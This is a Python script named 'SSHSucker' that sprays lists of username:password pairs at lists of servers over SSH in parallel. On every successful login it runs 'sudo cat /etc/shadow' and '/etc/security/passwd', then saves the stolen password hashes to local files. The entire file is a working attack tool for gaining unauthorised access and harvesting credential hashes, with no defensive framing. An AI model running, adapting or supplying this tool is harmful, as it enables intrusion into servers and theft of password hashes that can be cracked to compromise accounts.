# coding: utf-8
import multiprocessing
from functools import partial
import paramiko
import pyfiglet
import logging
import socket
import time
import sys
import os

debug = True

def dEcho(text):
	
	global debug
	if debug:
		print("[DEBUG] %s" % text)
		
def isSSHOpen(server,port):

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(5)
	try:
		s.connect((server,int(port)))
		s.shutdown(2)
		return True
	except:
		return False

def getSSHShadow(server_address,server_username,server_pass):

	logging.info('[%s] [%s:%s] - SSH Thread Start' % (server_address,server_username,server_pass))

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		
		port = 0
		if isSSHOpen(server_address,22):
			port = 22
		elif isSSHOpen(server_address,2222):
			port = 2222

		logging.info('[%s] [%s:%s] - Trying SSH to %d' % (server_address,server_username,server_pass,port))
		ssh.connect(hostname=server_address,
		            username=server_username,
		            password=server_pass,
		            timeout=10,port=port)
		session = ssh.get_transport().open_session()
		connected = True
		
		logging.info('[%s] [%s:%s] - SSH connected!' % (server_address,server_username,server_pass))		
		session.set_combine_stderr(True)
		session.get_pty()
		session.exec_command("sudo /bin/cat /etc/shadow;sudo /usr/bin/cat /etc/security/passwd")
		stdin = session.makefile('wb', -1)
		stdout = session.makefile('rb', -1)
		stdin.write(server_pass + '\n')
		stdin.flush()
		
		endtime = time.time() + 10
		while not stdout.channel.eof_received:
			time.sleep(1)
			if time.time() > endtime:
				stdout.channel.close()
				break

		result = stdout.read().decode("utf-8")

		if "sudoers" in result:
			logging.info('[%s] [%s:%s] - OK, but no no sudo' % (server_address,server_username,server_pass))
		elif "root" in result:
			logging.info('[%s] [%s:%s] - OK' % (server_address,server_username,server_pass)) 
		try:
			file = open("extracted/%s-%s-%s.txt" % (server_address,server_username,server_pass),"w+")
			file.write(result)
			file.close()
		except:
			logging.info('[%s] [%s:%s] - Log Error' % (server_address,server_username,server_pass))
			pass
	except:
		logging.info('[%s] [%s:%s] - SSH error' % (server_address,server_username,server_pass))
		pass
	return True

def doSSHStuff(user,server):
	
	print(server)
	print(user)

def doPreparationSSHStuff(block):
	
	server = block.split(";")[0]
	user = block.split(";")[1]
	password = block.split(";")[2]
	#print('[%s] [%s:%s] - Starting' % (server,user,password))
	getSSHShadow(server,user,password)

def update_progress(progress):
	
	sys.stdout.write('\r[{0}] {1}%'.format('█'*(progress/5),progress))
	sys.stdout.flush()

def main(users,servers,threads):

	tasks = []
	for server in servers:
		for user in users:
			username = user.split(":")[0]
			password = user.split(":")[1]
			tasks.append("%s;%s;%s" % (server,username,password))

	pool = multiprocessing.Pool(processes=int(threads))
	results = pool.map_async(doPreparationSSHStuff,tasks)

	total_tasks = len(tasks)
	print("[!] Total of threads: %d" % total_tasks)

	while not results.ready():
		if total_tasks != results._number_left:
			remaining = (total_tasks-(total_tasks-results._number_left))
			percentage = round(((remaining*100)/total_tasks))
			update_progress(int(100-percentage))

		time.sleep(1)
	pool.close()
	pool.join()
	
if __name__ == '__main__':

	os.system("clear")
	result = pyfiglet.figlet_format("SSHSucker", font = "ogre" )
	print(result)
	format = "%(asctime)s: %(message)s"
	logging.basicConfig(format=format, level=logging.INFO,datefmt="%H:%M:%S",filename='app-info.log', filemode='w')
	#logging.basicConfig(format=format, level=logging.INFO,datefmt="%H:%M:%S")

	print("[SSH - Shadow sucker v0.1]")

	threads = 10
	user_file = ""
	server_file = ""
	s = 0
	
	if len(sys.argv) >= 3:
		for option in sys.argv:
			if option == "-u":
				user_file = sys.argv[s+1]
			elif option == "-s":
				server_file = sys.argv[s+1]
			elif option == "-t":
					threads = sys.argv[s+1]
			s +=1
		try:
			users = (open(user_file).read()).splitlines()
			servers = (open(server_file).read()).splitlines()
		except:
			print("Error opening files")

		main(users,servers,threads)

	else:
		print("Usage: script.py -u USERS -s SERVERS -t THREADS")
